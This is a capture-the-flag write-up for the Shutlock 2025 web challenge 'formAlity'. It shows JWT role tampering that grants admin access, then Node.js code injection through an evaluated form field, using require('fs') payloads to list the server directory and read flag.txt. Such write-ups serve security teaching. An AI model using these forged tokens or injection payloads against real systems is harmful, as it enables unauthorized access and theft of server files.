# formAlity - Shutlock 2025

> Bienvenue sur un site du Festival de Cannes.
>
> Sur ce site vous pourrez retrouver un sondage cinématographique. Vous pourrez aussi vous rapprocher d'un administrateur afin qu'il puisse vous générer un justificatif de présence.

## bypass admin role

`POST http://57.128.112.118:13237/register` with `username` and `password` gives token as cookie

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzUwNzA3OTg5ODMwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzcuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzUwNzA3OTkwfQ.6pRarYQOqP3uhEd1EaV0-AslpUCkU4QvLQfKX1BPa9o
```

```json
{"auth":1750707989830,"agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","role":"user","iat":1750707990}
```

when we go to `http://57.128.112.118:13237/name_form`, we see that our role is `user` as shown in the jwt.
let's try to update our role to `admin` by simply changing the `role` in the JWT token.

```javascript
>>> btoa(`{"auth":1750707989830,"agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","role":"admin","iat":1750707990}`);
eyJhdXRoIjoxNzUwNzA3OTg5ODMwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzcuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1MDcwNzk5MH0
```

let's use the new payload

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzUwNzA3OTg5ODMwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzcuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1MDcwNzk5MH0.6pRarYQOqP3uhEd1EaV0-AslpUCkU4QvLQfKX1BPa9o
```

let's reload and pray...

![alt text](images/shutlock2025_formAlity_certificate_page.png)

boom it works! classic but effective.

## certificate pdf

running a classic request looks like this

```
curl 'http://57.128.112.118:13237/submit_name' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzUwNzA3OTg5ODMwLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzcuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1MDcwNzk5MH0.6pRarYQOqP3uhEd1EaV0-AslpUCkU4QvLQfKX1BPa9o' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' \
  --data-raw "name=hello&surname=world" -o file.pdf && open file.pdf
```

![alt text](images/shutlock2025_formAlity_certificate_demo.png)

after a bit of tweaking, I found that `name` is somehow `eval`ued by doing `name=Boolean(false)`

![alt text](images/shutlock2025_formAlity_certificate_eval.png)

see, `Boolean` is completely ignored, it is actually called and shows its output (which is `false`), let's try to use `fs` module!

```
name=require('fs').readdirSync('.').toString()
```

![alt text](images/shutlock2025_formAlity_certificate_directory.png)

we can see a `flag.txt` file, let's read it!

```
name=require('fs').readFileSync('flag.txt').toString()
```

![alt text](images/shutlock2025_formAlity_certificate_flag.png)

boom, `SHLK{JwT_bYpaS5_2_RCe}` is our flag.
